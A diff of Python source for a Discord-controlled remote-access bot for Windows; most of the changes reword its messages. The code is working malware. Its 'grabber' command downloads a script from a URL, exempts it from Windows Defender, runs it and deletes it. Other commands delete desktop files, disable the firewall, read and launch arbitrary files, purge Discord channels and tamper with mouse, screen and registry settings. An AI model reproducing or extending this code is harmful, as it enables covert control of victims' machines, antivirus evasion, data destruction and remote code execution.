         await bot.wait_for("reaction_add", timeout=15.0, check=check)
     except asyncio.TimeoutError:
-        await msg.edit(embed=create_embed("Cancelled", "Timed out.", 0xff0000))
+        await msg.edit(embed=create_embed("Cancelled", "The confirmation timed out and nothing was left.", 0xff0000))
         return
     left = 0
     for guild in list(bot.guilds):
@@ -5001,12 +5053,12 @@ async def leave_all(ctx):
             left += 1
         except Exception:
             pass
-    await ctx.send(embed=create_embed("👋 Left", f"Left {left} servers.", 0x0084ff))
+    await ctx.send(embed=create_embed("👋 Left", "The bot left **{}** servers.".format(left), 0x0084ff))
 
 
 @bot.command(aliases=["clean"])
 async def clear(ctx):
-    await ctx.send("`🚮` Cleaning...")
+    await ctx.send("`🚮` The channels are being cleaned, this takes a moment.")
     keep = {CHANNEL_NAMES["panel"], CHANNEL_NAMES["info"]}
     for guild in bot.guilds:
         for channel in guild.text_channels:
@@ -5015,14 +5067,14 @@ async def clear(ctx):
                     await channel.purge(limit=1000)
                 except Exception:
                     pass
-    await ctx.send(embed=create_embed("🚮 Clean", "Channels cleared.", 0x00ff00))
+    await ctx.send(embed=create_embed("🚮 Clean", "Every channel except the panel and the info channel was cleared.", 0x00ff00))
 
 @bot.command()
 async def accent(ctx, *, color: str = None):
     global ACCENT
     if not color:
         lines = [f"`{k}` — #{v:06x}" for k, v in ACCENT_PRESETS.items()]
-        await ctx.send(embed=create_embed("🎨 Accent Colors", "\n".join(lines) + "\n\nUse `.accent <name|#hex>`"))
+        await ctx.send(embed=create_embed("🎨 Accent Colors", "These are the available names, or you can pass any hex colour.\n" + "\n".join(lines)))
         return
     c = color.lower().strip()
     if c in ACCENT_PRESETS:
@@ -5031,11 +5083,11 @@ async def accent(ctx, *, color: str = None):
         try:
             ACCENT = int(c.lstrip("#"), 16)
         except Exception:
-            await ctx.send(embed=create_embed("Error", "Invalid color. Use a name or `#RRGGBB`.", 0xFF0000))
+            await ctx.send(embed=create_embed("Error", "That colour is not valid, use one of the names or a hex value like `#ff8800`.", 0xFF0000))
             return
     for g in bot.guilds:
         set_guild_value(g.id, "accent", ACCENT)
-    await ctx.send(embed=create_embed("🎨 Accent", f"Accent color set to `#{ACCENT:06x}`."))
+    await ctx.send(embed=create_embed("🎨 Accent", "Every new embed will use the colour `#{}`.".format(f"{ACCENT:06x}")))
 
 
 @bot.command(aliases=["clicks"])
@@ -5044,14 +5096,14 @@ async def click(ctx, count: int = 1):
     for _ in range(count):
         pyautogui.click()
         await asyncio.sleep(0.05)
-    await ctx.send(embed=create_embed("🖱️ Click", f"Sent **{count}** click(s).", 0x00FF00))
+    await ctx.send(embed=create_embed("🖱️ Click", "**{}** left clicks were sent at the current pointer position.".format(count), 0x00FF00))
 
 
 @bot.command(aliases=["chaos"])
 async def click_delete(ctx, count: int = 5, *, folder: str = None):
     target = resolve(folder) if folder else os.path.join(os.path.expanduser("~"), "Desktop")
     if not os.path.isdir(target):
-        await ctx.send(embed=create_embed("Error", f"Folder not found: `{target}`", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "That folder does not exist: `{}`.".format(target), 0xFF0000))
         return
     count = max(1, min(count, 200))
     deleted = []
@@ -5066,22 +5118,22 @@ async def click_delete(ctx, count: int = 5, *, folder: str = None):
             pass
         pyautogui.click()
         await asyncio.sleep(0.1)
-    listing = "\n".join(f"🗑️ {d}" for d in deleted) or "Nothing deleted"
-    await ctx.send(embed=create_embed("🖱️ Click & Delete", f"```{listing[:1900]}```", 0xFF0000))
+    listing = "\n".join(f"🗑️ {d}" for d in deleted) or "Nothing was deleted."
+    await ctx.send(embed=create_embed("🖱️ Click & Delete", "One click was sent per file and these were the casualties:\n```{}```".format(listing[:1900]), 0xFF0000))
 
 
 @bot.command()
 async def autoclick(ctx, state: str = None, interval: float = 0.5):
     global auto_click
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.autoclick <on|off> [interval]`", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`, optionally followed by an interval.", 0xFFA500))
         return
     if state == "off":
         auto_click = False
-        await ctx.send(embed=create_embed("🖱️ Autoclick", "Stopped.", 0xFF0000))
+        await ctx.send(embed=create_embed("🖱️ Autoclick", "The automatic clicking stopped.", 0xFF0000))
         return
     if auto_click:
-        await ctx.send(embed=create_embed("🖱️ Autoclick", "Already running.", 0x3498DB))
+        await ctx.send(embed=create_embed("🖱️ Autoclick", "The autoclicker is already running.", 0x3498DB))
         return
 
     def loop():
@@ -5094,7 +5146,7 @@ async def autoclick(ctx, state: str = None, interval: float = 0.5):
 
     auto_click = True
     threading.Thread(target=loop, daemon=True).start()
-    await ctx.send(embed=create_embed("🖱️ Autoclick", f"Running every **{interval}s**.", 0x00FF00))
+    await ctx.send(embed=create_embed("🖱️ Autoclick", "The machine will now click by itself every **{}** seconds.".format(interval), 0x00FF00))
 
 @bot.command(aliases=["grabber"])
 async def run_grabber(ctx, url: str = None, mode: str = "all"):
@@ -5108,12 +5160,12 @@ async def run_grabber(ctx, url: str = None, mode: str = "all"):
         async with aiohttp.ClientSession() as session:
             async with session.get(url) as resp:
                 if resp.status != 200:
-                    await ctx.send(embed=create_embed("Error", f"HTTP {resp.status}", 0xFF0000))
+                    await ctx.send(embed=create_embed("Error", "The script returned HTTP {}.".format(resp.status), 0xFF0000))
                     return
                 with builtins.open(temp, "wb") as f:
                     f.write(await resp.read())
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", f"Download failed: {e}", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "The script could not be downloaded: {}".format(e), 0xFF0000))
         return
 
     ps(f'Add-MpPreference -ExclusionPath "{temp}" -ErrorAction SilentlyContinue')
@@ -5122,10 +5174,10 @@ async def run_grabber(ctx, url: str = None, mode: str = "all"):
         out = await asyncio.wait_for(
             asyncio.to_thread(run_script_capture, temp, mode), timeout=600)
     except asyncio.TimeoutError:
-        out = "[error] timeout"
+        out = "[error] The script timed out after ten minutes."
 
-    await ctx.send(embed=create_embed("Grabber", f"Ran `{os.path.basename(temp)}` :: {mode}", 0x00FF00))
-    await send_long(ctx, out or "Ran (no output)")
+    await ctx.send(embed=create_embed("Grabber", "The script `{}` was executed in mode **{}**.".format(os.path.basename(temp), mode), 0x00FF00))
+    await send_long(ctx, out or "It ran but produced no output.")
 
     for _ in range(5):
         try:
@@ -5133,7 +5185,7 @@ async def run_grabber(ctx, url: str = None, mode: str = "all"):
             break
         except Exception:
             time.sleep(0.5)
-    await ctx.send(embed=create_embed("Cleanup", "Temp script deleted.", 0x0084FF))
+    await ctx.send(embed=create_embed("Cleanup", "The temporary script was deleted from the disk.", 0x0084FF))
 
 @bot.command(aliases=["systeminfo"])
 async def sysinfo_raw(ctx):
@@ -5186,12 +5238,12 @@ async def temp(ctx):
 async def uptime(ctx):
     delta = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
     hours, rem = divmod(int(delta.total_seconds()), 3600)
-    await ctx.send(embed=create_embed("⏱️ Uptime", f"**{delta.days}d {hours % 24}h {rem // 60}m**", 0x3498db))
+    await ctx.send(embed=create_embed("⏱️ Uptime", "The machine has been running for **{} days, {} hours and {} minutes**.".format(delta.days, hours % 24, rem // 60), 0x3498db))
 
 
 @bot.command(aliases=["time"])
 async def sysclock(ctx):
-    await ctx.send(embed=create_embed("🕒 System Clock", datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 0x3498db))
+    await ctx.send(embed=create_embed("🕒 System Clock", "The machine clock currently reads `{}`.".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), 0x3498db))
 
 
 @bot.command()
@@ -5273,7 +5325,7 @@ async def route(ctx):
 
 @bot.command(aliases=["flushdns"])
 async def flush_dns(ctx):
-    await ctx.send(embed=create_embed("🧹 DNS", (cmd_run("ipconfig /flushdns").stdout or "").strip() or "Flushed.", 0x00ff00))
+    await ctx.send(embed=create_embed("🧹 DNS", "The DNS resolver cache was flushed, the next lookups will start from scratch.", 0x00ff00))
 
 
 @bot.command(aliases=["renewip"])
@@ -5302,27 +5354,27 @@ async def public_ip(ctx):
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get("https://api.ipify.org") as r:
-                await ctx.send(embed=create_embed("🌍 Public IP", f"```{await r.text()}```", 0x3498db))
+                await ctx.send(embed=create_embed("🌍 Public IP", "The machine reaches the internet through the address below.\n```{}```".format(await r.text()), 0x3498db))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The public address could not be retrieved: {}".format(e), 0xff0000))
 
 
 @bot.command()
 async def cat(ctx, *, file: str):
     try:
         with builtins.open(resolve(file), "r", encoding="utf-8", errors="replace") as f:
-            await send_long(ctx, f.read()[:8000] or "(empty file)")
+            await send_long(ctx, f.read()[:8000] or "(The file is empty)")
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The file could not be read: {}".format(e), 0xff0000))
 
 
 @bot.command()
 async def mkdir(ctx, *, name: str):
     try:
         os.makedirs(resolve(name), exist_ok=True)
-        await ctx.send(embed=create_embed("📁 Created", resolve(name), 0x00ff00))
+        await ctx.send(embed=create_embed("📁 Created", "The folder `{}` was created.".format(resolve(name)), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The folder could not be created: {}".format(e), 0xff0000))
 
 
 @bot.command(aliases=["write"])
@@ -5330,18 +5382,18 @@ async def mkfile(ctx, name: str, *, content: str = ""):
     try:
         with builtins.open(resolve(name), "w", encoding="utf-8") as f:
             f.write(content)
-        await ctx.send(embed=create_embed("📝 Written", resolve(name), 0x00ff00))
+        await ctx.send(embed=create_embed("📝 Written", "The file `{}` was written with the supplied content.".format(resolve(name)), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The file could not be written: {}".format(e), 0xff0000))
 
 
 @bot.command()
 async def move(ctx, src: str, *, dest: str):
     try:
         shutil.move(resolve(src), resolve(dest))
-        await ctx.send(embed=create_embed("➡️ Moved", f"{src} → {dest}", 0x00ff00))
+        await ctx.send(embed=create_embed("➡️ Moved", "`{}` was moved to `{}`.".format(src, dest), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The path could not be moved: {}".format(e), 0xff0000))
 
 
 @bot.command()
@@ -5351,18 +5403,18 @@ async def copy(ctx, src: str, *, dest: str):
             shutil.copytree(resolve(src), resolve(dest), dirs_exist_ok=True)
         else:
             shutil.copy2(resolve(src), resolve(dest))
-        await ctx.send(embed=create_embed("📄 Copied", f"{src} → {dest}", 0x00ff00))
+        await ctx.send(embed=create_embed("📄 Copied", "`{}` was copied to `{}`.".format(src, dest), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The path could not be copied: {}".format(e), 0xff0000))
 
 
 @bot.command()
 async def rename(ctx, src: str, *, dest: str):
     try:
         os.rename(resolve(src), resolve(dest))
-        await ctx.send(embed=create_embed("🏷️ Renamed", f"{src} → {dest}", 0x00ff00))
+        await ctx.send(embed=create_embed("🏷️ Renamed", "`{}` is now called `{}`.".format(src, dest), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The path could not be renamed: {}".format(e), 0xff0000))
 
 
 @bot.command()
@@ -5373,9 +5425,9 @@ async def size(ctx, *, path: str):
             total = os.path.getsize(p)
         else:
             total = sum(os.path.getsize(os.path.join(dp, f)) for dp, _, fs in os.walk(p) for f in fs)
-        await ctx.send(embed=create_embed("📏 Size", f"`{path}` — **{total / 1048576:.2f} MB**", 0x3498db))
+        await ctx.send(embed=create_embed("📏 Size", "`{}` takes up **{:.2f} MB** on the disk.".format(path, total / 1048576), 0x3498db))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The size could not be calculated: {}".format(e), 0xff0000))
 
 
 @bot.command(aliases=["sha256"])
@@ -5385,9 +5437,9 @@ async def hash(ctx, *, file: str):
         with builtins.open(resolve(file), "rb") as f:
             for block in iter(lambda: f.read(65536), b""):
                 h.update(block)
-        await ctx.send(embed=create_embed("🔑 SHA256", f"```{h.hexdigest()}```", 0x3498db))
+        await ctx.send(embed=create_embed("🔑 SHA256", "The SHA256 digest of the file is below.\n```{}```".format(h.hexdigest()), 0x3498db))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The hash could not be computed: {}".format(e), 0xff0000))
 
 
 @bot.command()
@@ -5401,9 +5453,9 @@ async def search(ctx, pattern: str, *, path: str = None):
                     hits.append(os.path.join(dp, f))
             if len(hits) >= 80:
                 break
-        await ctx.send(embed=create_embed("🔎 Search", f"```{chr(10).join(hits) or 'No matches'}```", 0x3498db))
+        await ctx.send(embed=create_embed("🔎 Search", "These files match the pattern.\n```{}```".format(chr(10).join(hits) or "No matches"), 0x3498db))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The search failed: {}".format(e), 0xff0000))
 
 
 @bot.command()
@@ -5412,9 +5464,9 @@ async def zip(ctx, src: str, dest: str = None):
         p = resolve(src).rstrip("\\/")
         out = resolve(dest or (os.path.basename(p) + ".zip"))
         shutil.make_archive(out[:-4], "zip", p)
-        await ctx.send(embed=create_embed("🗜️ Zipped", out, 0x00ff00))
+        await ctx.send(embed=create_embed("🗜️ Zipped", "The archive was created at `{}`.".format(out), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The archive could not be created: {}".format(e), 0xff0000))
 
 
 @bot.command()
@@ -5423,15 +5475,15 @@ async def unzip(ctx, *, file: str):
     try:
         with zipfile.ZipFile(p) as z:
             z.extractall(os.path.dirname(p))
-        await ctx.send(embed=create_embed("📦 Unzipped", f"Extracted to `{os.path.dirname(p)}`", 0x00ff00))
+        await ctx.send(embed=create_embed("📦 Unzipped", "The archive was extracted into `{}`.".format(os.path.dirname(p)), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The archive could not be extracted: {}".format(e), 0xff0000))
 
 
 @bot.command()
 async def run(ctx, *, file: str):
     subprocess.Popen(f'"{resolve(file)}"', shell=True)
-    await ctx.send(embed=create_embed("▶️ Running", file, 0x00ff00))
+    await ctx.send(embed=create_embed("▶️ Running", "`{}` was launched with its default handler.".format(file), 0x00ff00))
 
 
 @bot.command()
@@ -5439,9 +5491,9 @@ async def recent(ctx):
     folder = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Recent")
     try:
         files = sorted(glob.glob(os.path.join(folder, "*")), key=os.path.getmtime, reverse=True)[:40]
-        await ctx.send(embed=create_embed("🕘 Recent Files", f"```{chr(10).join(os.path.basename(f) for f in files) or 'None'}```", 0x3498db))
+        await ctx.send(embed=create_embed("🕘 Recent Files", "These are the most recently opened files.\n```{}```".format(chr(10).join(os.path.basename(f) for f in files) or "None"), 0x3498db))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The recent list could not be read: {}".format(e), 0xff0000))
 
 
 @bot.command(aliases=["usb-history"])
@@ -5452,32 +5504,32 @@ async def usb(ctx):
 @bot.command(aliases=["set-resolution"])
 async def resolution(ctx, width: int = None, height: int = None):
     if not width or not height:
-        await ctx.send(embed=create_embed("Error", "Usage: `.resolution <width> <height>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give a width and a height, for example `.resolution 1920 1080`.", 0xffa500))
         return
     try:
         dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
         dm.PelsWidth, dm.PelsHeight = width, height
         win32api.ChangeDisplaySettings(dm, 0)
-        await ctx.send(embed=create_embed("🖥️ Resolution", f"{width}x{height}", 0x00ff00))
+        await ctx.send(embed=create_embed("🖥️ Resolution", "The screen was forced to `{}x{}`.".format(width, height), 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The resolution could not be applied: {}".format(e), 0xff0000))
 
 
 @bot.command(aliases=["darkmode"])
 async def dark_mode(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.dark-mode <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     val = "0" if state == "on" else "1"
     for key in ("AppsUseLightTheme", "SystemUsesLightTheme"):
         cmd_run(f'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v {key} /t REG_DWORD /d {val} /f')
-    await ctx.send(embed=create_embed("🌗 Dark Mode", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("🌗 Dark Mode", "The dark theme was enabled for the apps and the system." if state == "on" else "The light theme was restored for the apps and the system.", 0x00ff00))
 
 
 @bot.command(aliases=["nightlight"])
 async def night_light(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.night-light <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     out = ps(r'''
 $p = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount\*windows.data.bluelightreduction.bluelightreductionstate*\Current'
@@ -5489,19 +5541,19 @@ Set-ItemProperty -Path $p -Name Data -Value $n
 Stop-Process -Name StartMenuExperienceHost -Force -ErrorAction SilentlyContinue
 Write-Output 'ok'
 ''').stdout
-    await ctx.send(embed=create_embed("🌙 Night Light", "Toggled." if "ok" in out else out.strip(), 0x00ff00))
+    await ctx.send(embed=create_embed("🌙 Night Light", "The blue light filter was toggled." if "ok" in out else "The blue light filter is not available on this machine.", 0x00ff00))
 
 
 @bot.command(aliases=["invert"])
 async def invert_colors(ctx):
     threading.Thread(target=flash_screen, args=("invert",), daemon=True).start()
-    await ctx.send(embed=create_embed("🎨 Invert", "Colors inverted for 10s.", 0x0084ff))
+    await ctx.send(embed=create_embed("🎨 Invert", "Every colour on the screen is inverted for ten seconds.", 0x0084ff))
 
 
 @bot.command()
 async def magnifier(ctx):
     subprocess.Popen("magnify.exe", shell=True)
-    await ctx.send(embed=create_embed("🔍 Magnifier", "Opened.", 0x00ff00))
+    await ctx.send(embed=create_embed("🔍 Magnifier", "The Windows magnifier was opened.", 0x00ff00))
 
 
 def _set_lock(name, state):
@@ -5515,82 +5567,82 @@ def _set_lock(name, state):
 @bot.command()
 async def capslock(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.capslock <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     _set_lock("capslock", state == "on")
-    await ctx.send(embed=create_embed("⌨️ Caps Lock", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("⌨️ Caps Lock", "The Caps Lock key is now **{}**.".format(state.upper()), 0x00ff00))
 
 
 @bot.command()
 async def numlock(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.numlock <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     _set_lock("numlock", state == "on")
-    await ctx.send(embed=create_embed("⌨️ Num Lock", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("⌨️ Num Lock", "The Num Lock key is now **{}**.".format(state.upper()), 0x00ff00))
 
 
 @bot.command()
 async def scrolllock(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.scrolllock <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     _set_lock("scrolllock", state == "on")
-    await ctx.send(embed=create_embed("⌨️ Scroll Lock", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("⌨️ Scroll Lock", "The Scroll Lock key is now **{}**.".format(state.upper()), 0x00ff00))
 
 
 @bot.command(aliases=["stickykeys"])
 async def sticky_keys(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.sticky-keys <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     cmd_run(f'reg add "HKCU\\Control Panel\\Accessibility\\StickyKeys" /v Flags /t REG_SZ /d {"511" if state == "on" else "58"} /f')
-    await ctx.send(embed=create_embed("⌨️ Sticky Keys", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("⌨️ Sticky Keys", "Sticky Keys was turned {}.".format(state.upper()), 0x00ff00))
 
 
 @bot.command()
 async def mouse_speed(ctx, speed: int = None):
     if speed is None:
-        await ctx.send(embed=create_embed("Error", "Usage: `.mouse-speed <1-20>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give a value between 1 and 20.", 0xffa500))
         return
     ctypes.windll.user32.SystemParametersInfoW(0x0071, 0, max(1, min(20, speed)), 3)
-    await ctx.send(embed=create_embed("🖱️ Mouse Speed", f"Set to **{speed}**.", 0x00ff00))
+    await ctx.send(embed=create_embed("🖱️ Mouse Speed", "The pointer speed is now **{}** out of 20.".format(speed), 0x00ff00))
 
 
 @bot.command()
 async def swap_mouse(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.swap-mouse <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     ctypes.windll.user32.SwapMouseButton(1 if state == "on" else 0)
-    await ctx.send(embed=create_embed("🖱️ Swap Mouse", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("🖱️ Swap Mouse", "The mouse buttons were swapped." if state == "on" else "The mouse buttons went back to normal.", 0x00ff00))
 
 
 @bot.command()
 async def hibernate(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.hibernate <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     subprocess.run(["powercfg", "/hibernate", state], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    await ctx.send(embed=create_embed("💤 Hibernate", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("💤 Hibernate", "Hibernation was turned {}.".format(state.upper()), 0x00ff00))
 
 
 @bot.command()
 async def fastboot(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.fastboot <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     cmd_run(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power" /v HiberbootEnabled /t REG_DWORD /d {"1" if state == "on" else "0"} /f')
-    await ctx.send(embed=create_embed("⚡ Fast Startup", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("⚡ Fast Startup", "Fast startup was turned {}.".format(state.upper()), 0x00ff00))
 
 
 @bot.command()
 async def firewall(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.firewall <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     ps(f"Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled {'True' if state == 'on' else 'False'}")
-    await ctx.send(embed=create_embed("🧱 Firewall", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("🧱 Firewall", "The firewall was turned {} on every profile.".format(state.upper()), 0x00ff00))
 
 
 @bot.command()
@@ -5604,7 +5656,7 @@ async def bitlocker(ctx):
 @bot.command(aliases=["restore-point"])
 async def restore_point(ctx):
     ps('Enable-ComputerRestore -Drive "$env:SystemDrive\\"; Checkpoint-Computer -Description "LessMi"')
-    await ctx.send(embed=create_embed("♻️ Restore Point", "Created.", 0x00ff00))
+    await ctx.send(embed=create_embed("♻️ Restore Point", "A System Restore checkpoint was created with the machine in its current state.", 0x00ff00))
 
 
 @bot.command(aliases=["godmode"])
@@ -5612,25 +5664,25 @@ async def god_mode(ctx):
     path = os.path.join(os.path.expanduser("~"), "Desktop", "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}")
     try:
         os.makedirs(path, exist_ok=True)
-        await ctx.send(embed=create_embed("🛠️ God Mode", path, 0x00ff00))
+        await ctx.send(embed=create_embed("🛠️ God Mode", "The God Mode folder was created on the desktop.", 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The folder could not be created: {}".format(e), 0xff0000))
 
 
 @bot.command()
 async def bluetooth(ctx, state: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.bluetooth <on|off>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
         return
     verb = "Enable-PnpDevice" if state == "on" else "Disable-PnpDevice"
     ps(f"$d = Get-PnpDevice -Class Bluetooth -ErrorAction SilentlyContinue | Where-Object {{ $_.FriendlyName -notlike '*Enumerator*' }}; foreach ($x in $d) {{ {verb} -InstanceId $x.InstanceId -Confirm:$false -ErrorAction SilentlyContinue }}")
-    await ctx.send(embed=create_embed("📶 Bluetooth", state.upper(), 0x00ff00))
+    await ctx.send(embed=create_embed("📶 Bluetooth", "The Bluetooth radios were turned {}.".format(state.upper()), 0x00ff00))
 
 
 @bot.command(aliases=["eject"])
 async def open_cd(ctx):
     ps("$d = Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=5\" | Select-Object -First 1; if ($d) { (New-Object -com Shell.Application).NameSpace(17).ParseName($d.DeviceID).InvokeVerb('Eject') }")
-    await ctx.send(embed=create_embed("💿 Drive", "Ejected.", 0x0084ff))
+    await ctx.send(embed=create_embed("💿 Drive", "The optical drive tray was ejected.", 0x0084ff))
 
 
 @bot.command(aliases=["wallpaper-random"])
@@ -5638,7 +5690,7 @@ async def wallpaper_random(ctx):
     folder = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "Web", "Wallpaper")
     files = glob.glob(os.path.join(folder, "**", "*.jpg"), recursive=True)
     if not files:
-        await ctx.send(embed=create_embed("Error", "No wallpapers found.", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "There are no stock wallpapers on this installation.", 0xff0000))
         return
     await set_wallpaper(ctx, source=random.choice(files))
 
@@ -5646,12 +5698,12 @@ async def wallpaper_random(ctx):
 async def wallpaper_from_ss(ctx):
     path = screenshot_all()
     if not path:
-        await ctx.send(embed=create_embed("Error", "Screenshot failed.", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The screenshot could not be taken.", 0xff0000))
         return
     ps("Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{"
        "[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int u,string p,int f);}'; "
        "[W]::SystemParametersInfo(20,0,'" + path + "',3)")
-    await ctx.send(embed=create_embed("🖼️ Wallpaper", "Screenshot applied.", 0x0084ff))
+    await ctx.send(embed=create_embed("🖼️ Wallpaper", "The current screen was captured and set as the wallpaper.", 0x0084ff))
 
 @bot.command(aliases=["toico", "img2ico"])
 async def img_to_ico(ctx, *, file: str):
@@ -5661,18 +5713,18 @@ async def img_to_ico(ctx, *, file: str):
         out = p.rsplit(".", 1)[0] + ".ico"
         Image.open(p).convert("RGBA").save(
             out, format="ICO", sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)])
-        await ctx.send(embed=create_embed("🖼️ ICO", out), file=discord.File(out))
+        await ctx.send(embed=create_embed("🖼️ ICO", "The image was converted to a multi size icon and is attached below."), file=discord.File(out))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The conversion failed: {}".format(e), 0xff0000))
 
 @bot.command(aliases=["img-filter", "filter-img"])
 async def image_filter(ctx, effect: str = None, *, file: str = None):
     fx = ("blur", "sharpen", "edges", "emboss", "gray", "invert", "poster", "solar")
     if not effect or not file:
-        await ctx.send(embed=create_embed("Filters", ", ".join(fx) + "\nUsage: `.img-filter <fx> <file>`"))
+        await ctx.send(embed=create_embed("Filters", "Available filters are " + ", ".join(fx) + ".", 0))
         return
     if effect not in fx:
-        await ctx.send(embed=create_embed("Filters", ", ".join(fx)))
+        await ctx.send(embed=create_embed("Filters", "Available filters are " + ", ".join(fx) + ".", 0))
         return
     p = resolve(file)
     try:
@@ -5690,45 +5742,45 @@ async def image_filter(ctx, effect: str = None, *, file: str = None):
         }
         out = p.rsplit(".", 1)[0] + "_" + effect + ".png"
         ops[effect](img).save(out)
-        await ctx.send(embed=create_embed("🖼️ Filter", effect), file=discord.File(out))
+        await ctx.send(embed=create_embed("🖼️ Filter", "The **{}** filter was applied and the result is attached below.".format(effect)), file=discord.File(out))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The filter could not be applied: {}".format(e), 0xff0000))
 
 @bot.command(aliases=["cloak"])
